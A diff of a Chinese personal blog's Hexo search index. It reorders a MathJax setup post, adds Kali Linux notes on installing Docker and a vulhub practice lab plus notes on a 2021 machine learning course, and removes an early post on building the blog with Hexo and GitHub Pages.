@@ -439,57 +439,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo博客搭建之结合MathJax插入数学公式</title>
-    <url>/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
-    <content><![CDATA[<h3 id="安装与配置-hexo-math"><a href="#安装与配置-hexo-math" class="headerlink" title="安装与配置 hexo-math"></a>安装与配置 hexo-math</h3><p>首先安装 <a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-math">hexo-math</a>插件，该插件使用 <code>MathJax/KaTex</code> 来渲染数学公式:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-math --save</span><br></pre></td></tr></table></figure>
-
-<p>安装完成后，配置hexo目录下的 <code>_config.yml</code>，加入下面配置信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  engine: &#x27;mathjax&#x27;</span><br><span class="line">  mathjax:</span><br><span class="line">    src: custom_mathjax_source</span><br><span class="line">    config:</span><br><span class="line">      # MathJax config</span><br></pre></td></tr></table></figure>
-
-<p>然后打开文件 <code>themes/next/_config.yml</code>，搜索关键词 <code>math</code>，将 <code>enable</code> 标签的值改为 <code>true</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span><br></pre></td></tr></table></figure>
-
-<h3 id="更改-Hexo-渲染引擎"><a href="#更改-Hexo-渲染引擎" class="headerlink" title="更改 Hexo 渲染引擎"></a>更改 Hexo 渲染引擎</h3><p>Hexo 的默认渲染引擎是 <code>hexo-renderer-marked</code>，需要将它替换为 <code>hexo-renderer-kramed</code><br>在安装 <code>hexo-renderer-kramed</code> 之前，需要卸载 <code>hexo-renderer-marked</code>，顺序执行以下两行命令完成卸载与安装：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-renderer-marked --save</span><br><span class="line">$ npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
-
-<h3 id="解决语义冲突"><a href="#解决语义冲突" class="headerlink" title="解决语义冲突"></a>解决语义冲突</h3><p>在 markdown 中，斜体用下划线 <code>_</code> 或星号 <code>*</code> 表示，而在 <code>LaTex</code> 中，下划线 <code>_</code> 表示下标，为了解决这个冲突，需要修改两处：<br>在博客根目录下，进入 <code>node_modules\kramed\lib\rules\inline.js</code> ，修改第 11 行 <code>escape</code> 变量的值（这一步是在原基础上对 <code>,&#123;,&#125;</code> 的 <code>转义(escape)</code> ）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">修改后：escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure>
-
-<p>同时，把第20行的em变量也做相应的修改：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">修改后：em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure>
-
-<h3 id="博客打开-MathJax-开关"><a href="#博客打开-MathJax-开关" class="headerlink" title="博客打开 MathJax 开关"></a>博客打开 MathJax 开关</h3><p>最后，在博客的 <code>Front-matter</code> 里，添加一行 <code>mathjax: true</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxxxxxxxxxxxx</span><br><span class="line">date: 2020-02-22 15:44:53</span><br><span class="line">tags: xxx</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<p>因为不是每次都需要使用，我在模版 <code>/scaffolds/draft.md</code> 里面添加了 <code>mathjax: false</code>，需要使用的时候再手动更改为 <code>true</code> 即可。</p>
-<h3 id="Markdown-勾选内联公式"><a href="#Markdown-勾选内联公式" class="headerlink" title="Markdown 勾选内联公式"></a>Markdown 勾选内联公式</h3><p>博客写作采用的<a href="https://sspai.com/post/64488">One Markdown</a>软件，直接支持数学公式，不需要进行配置</p>
-<p>平时记笔记写周报用的<a href="https://www.typora.net/">Typora</a>软件，需要手动修改一下设置勾选：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 -&gt; 偏好设置 -&gt; Markdown -&gt; 内联公式</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Typora-File.jpg" alt="settings"><br><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Markdown-settings.jpg" alt="settings"></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
-<p>公式单行居中显示</p>
-</blockquote>
-<p><code>LaTex</code> 公式两端的 <code>$$</code> 表示公式居中显示，键入下面的 <code>LaTex</code> 公式，代码及效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $$</span><br></pre></td></tr></table></figure>
-<p>$$ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $$</p>
-<blockquote>
-<p>公式嵌入到句子中</p>
-</blockquote>
-<p>若想在一句话中嵌入公式，则只需要在 <code>LaTex</code> 公式两端用一个 <code>$</code>，代码及效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在公式 $ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</span><br></pre></td></tr></table></figure>
-<p>在公式 $ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</p>
-<h3 id="数学公式-LaTex-基本元素语法"><a href="#数学公式-LaTex-基本元素语法" class="headerlink" title="数学公式 LaTex 基本元素语法"></a>数学公式 LaTex 基本元素语法</h3><p>待续。。。</p>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Blog</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo博客搭建之NexT主题美化</title>
     <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BNexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
     <content><![CDATA[<h2 id="安装-NexT"><a href="#安装-NexT" class="headerlink" title="安装 NexT"></a>安装 NexT</h2><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 <code>themes</code> 目录下， 然后修改下配置文件即可，安装步骤如下：</p>
@@ -661,6 +610,87 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo博客搭建之结合MathJax插入数学公式</title>
+    <url>/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
+    <content><![CDATA[<h3 id="安装与配置-hexo-math"><a href="#安装与配置-hexo-math" class="headerlink" title="安装与配置 hexo-math"></a>安装与配置 hexo-math</h3><p>首先安装 <a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-math">hexo-math</a>插件，该插件使用 <code>MathJax/KaTex</code> 来渲染数学公式:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-math --save</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，配置hexo目录下的 <code>_config.yml</code>，加入下面配置信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">math:</span><br><span class="line">  engine: &#x27;mathjax&#x27;</span><br><span class="line">  mathjax:</span><br><span class="line">    src: custom_mathjax_source</span><br><span class="line">    config:</span><br><span class="line">      # MathJax config</span><br></pre></td></tr></table></figure>
+
+<p>然后打开文件 <code>themes/next/_config.yml</code>，搜索关键词 <code>math</code>，将 <code>enable</code> 标签的值改为 <code>true</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mathjax:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: false</span><br><span class="line">  cdn: //cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML</span><br></pre></td></tr></table></figure>
+
+<h3 id="更改-Hexo-渲染引擎"><a href="#更改-Hexo-渲染引擎" class="headerlink" title="更改 Hexo 渲染引擎"></a>更改 Hexo 渲染引擎</h3><p>Hexo 的默认渲染引擎是 <code>hexo-renderer-marked</code>，需要将它替换为 <code>hexo-renderer-kramed</code><br>在安装 <code>hexo-renderer-kramed</code> 之前，需要卸载 <code>hexo-renderer-marked</code>，顺序执行以下两行命令完成卸载与安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm uninstall hexo-renderer-marked --save</span><br><span class="line">$ npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="解决语义冲突"><a href="#解决语义冲突" class="headerlink" title="解决语义冲突"></a>解决语义冲突</h3><p>在 markdown 中，斜体用下划线 <code>_</code> 或星号 <code>*</code> 表示，而在 <code>LaTex</code> 中，下划线 <code>_</code> 表示下标，为了解决这个冲突，需要修改两处：<br>在博客根目录下，进入 <code>node_modules\kramed\lib\rules\inline.js</code> ，修改第 11 行 <code>escape</code> 变量的值（这一步是在原基础上对 <code>,&#123;,&#125;</code> 的 <code>转义(escape)</code> ）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span><br><span class="line">修改后：escape: /^\\([`*\[\]()#$+\-.!_&gt;])/,</span><br></pre></td></tr></table></figure>
+
+<p>同时，把第20行的em变量也做相应的修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br><span class="line">修改后：em: /^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span><br></pre></td></tr></table></figure>
+
+<h3 id="博客打开-MathJax-开关"><a href="#博客打开-MathJax-开关" class="headerlink" title="博客打开 MathJax 开关"></a>博客打开 MathJax 开关</h3><p>最后，在博客的 <code>Front-matter</code> 里，添加一行 <code>mathjax: true</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxxxxxxxxxxxx</span><br><span class="line">date: 2020-02-22 15:44:53</span><br><span class="line">tags: xxx</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<p>因为不是每次都需要使用，我在模版 <code>/scaffolds/draft.md</code> 里面添加了 <code>mathjax: false</code>，需要使用的时候再手动更改为 <code>true</code> 即可。</p>
+<h3 id="Markdown-勾选内联公式"><a href="#Markdown-勾选内联公式" class="headerlink" title="Markdown 勾选内联公式"></a>Markdown 勾选内联公式</h3><p>博客写作采用的<a href="https://sspai.com/post/64488">One Markdown</a>软件，直接支持数学公式，不需要进行配置</p>
+<p>平时记笔记写周报用的<a href="https://www.typora.net/">Typora</a>软件，需要手动修改一下设置勾选：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件 -&gt; 偏好设置 -&gt; Markdown -&gt; 内联公式</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Typora-File.jpg" alt="settings"><br><img src="/2022/03/17/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E7%BB%93%E5%90%88MathJax%E6%8F%92%E5%85%A5%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/Markdown-settings.jpg" alt="settings"></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote>
+<p>公式单行居中显示</p>
+</blockquote>
+<p><code>LaTex</code> 公式两端的 <code>$$</code> 表示公式居中显示，键入下面的 <code>LaTex</code> 公式，代码及效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $$</span><br></pre></td></tr></table></figure>
+<p>$$ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $$</p>
+<blockquote>
+<p>公式嵌入到句子中</p>
+</blockquote>
+<p>若想在一句话中嵌入公式，则只需要在 <code>LaTex</code> 公式两端用一个 <code>$</code>，代码及效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在公式 $ evidence_&#123;i&#125;=\sum_&#123;j&#125;W_&#123;ij&#125;x_&#123;j&#125;+b_&#123;i&#125; $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</span><br></pre></td></tr></table></figure>
+<p>在公式 $ evidence_{i}=\sum_{j}W_{ij}x_{j}+b_{i} $ 中，$W_i$ 和 $b_i$ 分别为类别 $i$ 的权值和偏置。</p>
+<h3 id="数学公式-LaTex-基本元素语法"><a href="#数学公式-LaTex-基本元素语法" class="headerlink" title="数学公式 LaTex 基本元素语法"></a>数学公式 LaTex 基本元素语法</h3><p>待续。。。</p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali Linux 笔记整理</title>
+    <url>/2022/07/04/Kali-Linux-%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p>!(1.root切换)[kali切换root用户]</p>
+<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
+
+<p>下载docker引擎并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p>接下来安装docker-compose并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
+
+<p>下载vulhub：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux命令合集</title>
     <url>/2022/03/14/Linux%E5%91%BD%E4%BB%A4%E5%90%88%E9%9B%86/</url>
     <content><![CDATA[<h3 id="一、Linux-命令行切换路径"><a href="#一、Linux-命令行切换路径" class="headerlink" title="一、Linux 命令行切换路径"></a>一、Linux 命令行切换路径</h3><h4 id="1-切换目录"><a href="#1-切换目录" class="headerlink" title="1. 切换目录"></a>1. 切换目录</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入用户主目录</span><br><span class="line">cd ~</span><br><span class="line"># 返回进入此目录之前所在目录</span><br><span class="line">cd - </span><br><span class="line"># 返回上级目录(若为根目录则显示/,切换后无变化）</span><br><span class="line">cd ..</span><br><span class="line"># 返回上两级目录</span><br><span class="line">cd ../..</span><br></pre></td></tr></table></figure>
@@ -710,420 +740,99 @@
       </tags>
   </entry>
   <entry>
-    <title>My First Blog</title>
-    <url>/2021/07/31/My-First-Blog/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
-<ol>
-<li>全是静态文件，访问速度快；</li>
-<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>
-<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</li>
-<li>数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</li>
-<li>博客内容可以轻松打包、转移、发布到其它平台；</li>
-</ol>
-<p><img src="https://github.com/xinkjung/Photos/raw/master/xhr.jpg" alt="xhr"></p>
-<span id="more"></span>
+    <title>Machine Learning 2021 Spring - Day2</title>
+    <url>/2022/07/04/Machine-Learning-2021-Spring-Day2/</url>
+    <content><![CDATA[<span id="more"></span>
 
-
-<h1 id="My-First-Blog–搭建过程"><a href="#My-First-Blog–搭建过程" class="headerlink" title="My First Blog–搭建过程"></a>My First Blog–搭建过程</h1><blockquote>
-<p>准备</p>
-</blockquote>
+<h2 id="Framework-of-ML"><a href="#Framework-of-ML" class="headerlink" title="Framework of ML"></a>Framework of ML</h2><p>通过三个步骤对训练数据集进行训练，然后带入模型对测试数据集进行训练，最终得到结果。</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/1.FrameworkofML.png" alt="Framework of ML"></p>
+<p>就比如以下四个例子，对输入数据 $x$ 进行识别，得到真实标签 $ \widehat y $ 的值：</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/2.DataRecognition.png" alt="Data Recognition"></p>
+<h2 id="General-Guide"><a href="#General-Guide" class="headerlink" title="General Guide"></a>General Guide</h2><p>按照下图的流程依次检查 training data 的 loss，然后根据实际来判别属于哪种情况：</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/3.GeneralGuide.png" alt="General Guide"></p>
+<p>如果发现你的 training data 的 loss 很大，显然它在训练资料上面也没有学好，然后接下来分析是什么原因造成了在训练资料上没有学好呢？这边有两个可能：</p>
+<h3 id="model-bias"><a href="#model-bias" class="headerlink" title="model bias"></a>model bias</h3><p>就好比在一个根本没有针的大海里捞针。</p>
 <ul>
-<li>Node.js ： <a href="https://nodejs.org/en/%22%E5%AE%98%E7%BD%91%22">官网</a> 下载最新版本，默认安装即可</li>
-<li>Git ：可通过 <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Git安装教程</a> 对于不同系统进行操作，也是默认安装即可</li>
-<li>Hexo ： <a href="https://hexo.io/zh-cn/docs/index.html">Hexo官网</a> ，有详细配置操作</li>
-<li>Github ： 没有就注册一个账号</li>
+<li><p>由 model 过于简单而造成</p>
+</li>
+<li><p>解决方案：重新定义 model 使其更加灵活</p>
+</li>
 </ul>
-<blockquote>
-<p>本地设置初始化</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/4.Solution.png" alt="Solution"></p>
+<h3 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h3><p>这就好像是在大海捞针，但你不能找到它。</p>
+<ul>
+<li>巨大的损失也并不只是 model bias 造成的，也有别的可能，比如 optimization</li>
+</ul>
+<h3 id="Model-Bias-v-s-Optimization-Issue"><a href="#Model-Bias-v-s-Optimization-Issue" class="headerlink" title="Model Bias v.s. Optimization Issue"></a>Model Bias v.s. Optimization Issue</h3><ul>
+<li>Ganing the insights from comparison</li>
+</ul>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/5.OptimizationIssue.png" alt="Optimization Issue"></p>
+<ul>
+<li>Start from shallower networks(or other models), which are easier to optimize.</li>
+<li>If deeper networks do not obtain smaller loss on <strong>traning data</strong> ,then there is optimization issue.</li>
+<li>Solution: More powerful optimization technology(next lecture)…</li>
+</ul>
+<h3 id="Overfitting"><a href="#Overfitting" class="headerlink" title="Overfitting"></a>Overfitting</h3><ul>
+<li>训练集数据的损失小，而测试集数据的损失大 </li>
+</ul>
+<p>举一个特殊的极端例子，function 的 $x$ 当作输入的时候，比对其有没有出现在训练资料里面，如果有，就直接把他对应的 $\widehat y$ 当作输出，；如果没有，则输出一个随机的值。 这个例子的训练资料的损失就是0，而测试集数据的损失却很大。</p>
+<p>如果 model 自由度很大的话，会造成训练资料上的结果好，但是测试资料上的 loss 很大。</p>
+<ul>
+<li>解决方法：增加训练资料 ；给模型一些限制<ul>
+<li>Less parameters(or deeplearning,less neurons), sharing parameters</li>
+<li>Less features</li>
+<li>Early stopping</li>
+<li>Regularization</li>
+<li>Dropout (deeplearning)</li>
+</ul>
+</li>
+</ul>
+<p>但是对于更多特征或更多参数的复杂的 model，会造成越复杂training loss越小，但testing loss经过最低值后会变大的情况，这时选择中间合适的点来作为model。</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/6.Bias-ConplexityTradeOff.png" alt="Bias-ComplexityTradeOff"> </p>
+<p>也可以对 training set 进行一个划分，划成 training 和 validation 数据集，然后计算损失误差值，取平均值再选择最好的一个用于 testing set 的训练。</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/7.N-foldCrossValidation.png" alt="N-foldCrossValidation"></p>
+<h3 id="Mismatch"><a href="#Mismatch" class="headerlink" title="Mismatch"></a>Mismatch</h3><ul>
+<li>另一种错误的形式：模型认为根据以往数据应该是最低点，但实际不是而形成的不匹配</li>
+<li>训练资料和测试资料分布不同</li>
+</ul>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/8.Mismatch.png" alt="Mismatch"></p>
+<h2 id="类神经网络训练不起来怎么办？"><a href="#类神经网络训练不起来怎么办？" class="headerlink" title="类神经网络训练不起来怎么办？"></a>类神经网络训练不起来怎么办？</h2><p>当参数对 loss 的微分为0的时候，gradient descent 就没有办法再 update 参数了，这时 training 就停下来了。</p>
+<ul>
+<li>local minima (局部最小值): gradient is close to zero，没有解决办法</li>
+<li>saddle point (鞍点): gradient is close to zero，可以找到方法使 loss 更低</li>
+<li>critical point: gradient 为0的点的统称</li>
+</ul>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/9.CriticalPoint.png" alt="Critical Point"></p>
+<h3 id="Local-Minima-v-s-Saddle-Point"><a href="#Local-Minima-v-s-Saddle-Point" class="headerlink" title="Local Minima v.s. Saddle Point"></a>Local Minima v.s. Saddle Point</h3><p>我们可以通过 minimum ratio 的比例大小来判断具体是局部最小值还是鞍点：</p>
+<ul>
+<li>如果所有 eigen value 都是正的，代表这个 critical point 是 local minima</li>
+<li>如果 eigen value 有正有负，代表是 saddle point</li>
+</ul>
+<p>ps:但我们实际上会发现几乎找不到完全所有 eigen value 都是正的 critical point</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/10.EmpiricalStudy.png" alt="Empirical Study"></p>
+<p>经验来讲，local minima 并不那么常见，多数时候训练到一定时候发现 gradient 很小了，参数也不 update 往往是因为卡在了 saddle point 。</p>
+<h3 id="Batch-v-s-Momentum"><a href="#Batch-v-s-Momentum" class="headerlink" title="Batch v.s. Momentum"></a>Batch v.s. Momentum</h3><blockquote>
+<p>Batch</p>
 </blockquote>
-<p>在你新建立文件夹下（如Blog），右键任意位置，选择 Git Bash Here，出现如下界面<br><img src="https://github.com/xinkjung/Photos/raw/master/GitBashHere.jpg" alt="GBH"></p>
-<p>此时进行初始化操作，首先执行“hexo init”命令   </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
+<p>先来回顾一下 Optimization with Batch:<br>    每一个 Batch 的大小就是一个大B（一大笔资料），每次 update 参数时，就是拿大B出来计算 loss 和 gradient 。</p>
+<p><img src="/2022/07/04/Machine-Learning-2021-Spring-Day2/11.OptimizationWithBatch.png" alt="Review: Optimization with Batch"></p>
+<ul>
+<li>所有的 Batch 看过一遍，叫做一个 Epoch</li>
+<li>在每一个 Epoch 开始之前，会分一次 Batch ，而且每一次 Epoch 的 Batch 都不一样（重新划分），哪些资料在同一个 Batch 里面每一个 Epoch 都不一样这件事情，叫做 Shuffle </li>
+</ul>
+<span class="label info"> Tips：将Shuffle理解为洗牌，Epoch理解为发牌</span>
 
-<p> 并执行如下命令，安装 npm</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
-
-<p>然后进行生成预览及上传一系列操作：</p>
-<pre><code>$ hexo g # == hexo generate 生成
-$ hexo s # == hexo server 本地预览
-$ hexo d # == hexo deploy 上传 
-</code></pre>
-<p>在浏览器中打开网址 <a href="https://localhost:4000/">https://localhost:4000</a> ，显示如下画面，就OK啦！（它已经自动写好了一篇Hello World的文章）<br><img src="https://github.com/xinkjung/Photos/raw/master/Hexo.jpg" alt="Hexo"></p>
-<blockquote>
-<p>绑定Github</p>
-</blockquote>
-<p>   首先创建一个名为 ‘你的用户名.github.io’的仓库，以后你的博客访问地址就是 https://你的用户名.github.io</p>
-<p>然后可以绑定域名，我没进行这个操作就省略了哈。</p>
-<p>下面就要配置SSH Key了<br>同上，一样的在你的根目录（我的是Blog）下使用Git Bash执行命令 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/. ssh #这个命令用于检测本机已存在的SSH key</span><br></pre></td></tr></table></figure>
-
-<p>若提示：No such file or directory 说明你是第一次使用git。</p>
-<p>然后再输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</span><br></pre></td></tr></table></figure>
-
-<p>连续三次回车，会生成一个名为 ‘.ssh\id_rsa.pub’ 的文件在你的用户目录下。找到此文件，记事本打开并复制里面内容，再进入你的Github主页，找到个人设置下的SSH and GPG keys -&gt; New SSH key， 把刚才复制的内容粘贴到key那里，title随便填，保存。<br>（这时你应该会收到一个邮件）</p>
-<p>但是还不确定是否配置成功对吧，那我们现在来测试一下</p>
-<p>同样的，在Git Bash 中输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com  ##注意此处不用更改邮箱地址</span><br></pre></td></tr></table></figure>
-
-<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会出现如下字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
-
-<p>就表示你的SSH key已经配置成功啦！！！</p>
-<p>然后还要配置文件_config.yml中的deploy部分，用记事本打开该文件（Blog根目录下），修改如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:你的用户名/你的用户名.github.io.git</span><br><span class="line">  branch: hexo          # 这里建议不要存放于主分支master下，这是我的子分支hexo</span><br></pre></td></tr></table></figure>
-
-<p>保存退出，再在Git Bash下执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-
-<p>这时，再输入 hexo d，就会将本次有改动的代码全部提交，没有改动的不会。<br>命令执行成功后，浏览器中打开网址 https://你的用户名.github.io 就会看到和刚才打开 <a href="https://localhost:4000/">https://localhost:4000</a> 一样的页面，博客就搭建好啦！！！</p>
-<blockquote>
-<p>注意保留CNAME、README.md等文件</p>
-</blockquote>
